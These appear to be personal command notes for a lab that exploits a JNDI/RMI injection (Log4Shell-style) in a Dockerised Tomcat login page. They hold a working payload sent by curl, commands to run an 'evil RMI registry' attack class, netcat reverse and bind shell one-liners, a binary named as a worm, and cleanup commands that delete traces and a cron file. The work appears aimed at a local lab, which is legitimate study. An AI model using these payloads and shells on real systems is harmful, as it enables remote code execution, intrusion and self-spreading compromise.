sudo docker pull badwolf815/malware
sudo docker pull badwolf815/malware8081
sudo apt install default-jdk
# sudo apt install unrar
sudo docker rm -f $(docker ps -a -q) # delete all stopped containers
sudo docker ps -a
sudo docker logs d2e7c1252df3


apt update && apt install cron vim default-jdk

/root/Im_legit localhost:8081 localhost:8081/login /root/Im_a_legit_worm > /dev/null 2>&1

sudo lsof -i:1097


# /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/javac -cp tomcat-catalina-8.5.83.jar --add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED --add-modules jdk.naming.rmi Attack.java
/usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -cp tomcat-catalina-8.5.83.jar:. Attack

Using java or javac version 17 DOESN'T WORK!
	root@Your-Crush:~# /usr/lib/jvm/java-1.17.0-openjdk-amd64/bin/java -cp tomcat-catalina-8.5.83.jar:. Attack
	Creating evil RMI registry on port 1097
	Exception in thread "main" java.lang.IllegalAccessError: class Attack (in unnamed module @0x2f4551e6) cannot access class com.sun.jndi.rmi.registry.ReferenceWrapper (in module jdk.naming.rmi) because module jdk.naming.rmi does not export com.sun.jndi.rmi.registry to unnamed module @0x2f4551e6
		at Attack.main(Attack.java:19)


javac -cp Tomcat/tomcat-catalina-8.5.83.jar --add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED --add-modules jdk.naming.rmi Attack.java 
java -cp Tomcat/tomcat-catalina-8.5.83.jar:. Attack

sudo docker pull badwolf815/malware

sudo docker ps
sudo docker kill d7cacaa1691b
a=`sudo docker run -d --network host 7e4895f6c652` ; sudo docker exec -it $a bash

a=`sudo docker run -d --network host 8035d21facf2` ; sudo docker exec -it $a bash

sudo docker run -d --network host 7e4895f6c652
sudo docker exec -it bebc3484d64ba279b2613af8e8b5273840d85dbf78220e2ad3f8bdf6ce8456ae bash


a=`sudo docker run -d -p 8081:8080 -p 6969:6969 -p 1097:1097 7e4895f6c652` && sudo docker exec -it $a bash


# Run another instance of docker in different port
sudo docker run -d -p 8081:8080 -p 6969:6969 -p 1097:1097 7e4895f6c652
sudo docker exec -it ebf74b369c3468268de7580a90e54092166009ab128866232c31184737f5dd21 bash

rm .dbus-update-errors .selected_editor Attack.class Im_a_legit_worm Im_legit syslog tomcat-catalina-8.5.83.jar .wget-hsts ; rm /etc/cron.hourly/man-db


sudo docker images
sudo docker run --network host 755b2c5d9018

http://localhost:8080/
${jndi:rmi://localhost:1097/Object}
STOP with ctrl+C


nc -lvp 6969
nc -lp 6969



sudo docker run -d --network host 7e4895f6c652
	423cb753af3a2c0987e693796f9ea6660ac63b9f981ee991250edba77e5809f9
sudo docker exec -it 423cb753af3a2c0987e693796f9ea6660ac63b9f981ee991250edba77e5809f9 bash
	apt update
	apt install iputils-ping
	apt install ncat
sudo docker attach 423cb753af3a2c0987e693796f9ea6660ac63b9f981ee991250edba77e5809f9

ncat localhost 6969 -e /bin/bash

# BE CAREFUL, SHUTTING DOWN THE CONTAINER REMOVES NCAT

apt install iproute2




curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "uname=%24%7Bjndi%3Armi%3A%2F%2Flocalhost%3A1097%2FObject%7D&password=" http://localhost:8080/login


awk '/<input/,/>/' sample.html


lis=`awk '/<input/,/>/' sample.html`
sed -n '/token/s/.*name="\s\+\([^"]\+\).*/\1/p' input_file

awk '/<input/,/>/' sample.html | grep -Po 'name="\K[^"]*'






Net Cat:
	Send data: nc localhost 10000 < send.txt
	Receive data: nc -l -p 10000 > receive.txt

	Netcat Options (bind shell vs reverse shell): https://www.infosecademy.com/netcat-reverse-shells/
		Attacker: nc -lp 6969 
		Victim: ncat localhost 6969 -e /bin/bash
		
	-->	Attacker: nc -q 0 localhost 6969
		Victim: ncat -lp 6969 -e /bin/bash
	
	ncat for a script (Attacker):
		cat test_script_touch.sh | nc -q 0 localhost 6969 # Option -q 0 to wait 0 seconds before quitting after executing the script, -c for GNU implementation of netcat
	
	nc localhost 10000 <<END
	ls
	pwd
	END

nmap -p0-65535 localhost
	
Info Advanced Persistent Thread: https://flaviu.io/advanced-persistent-threat/

Java step-by-step compilation: https://www.geeksforgeeks.org/java-platform-independent/


./Script_to_String_RAW.sh Master_script.sh

./Script_to_String.sh Worm.sh



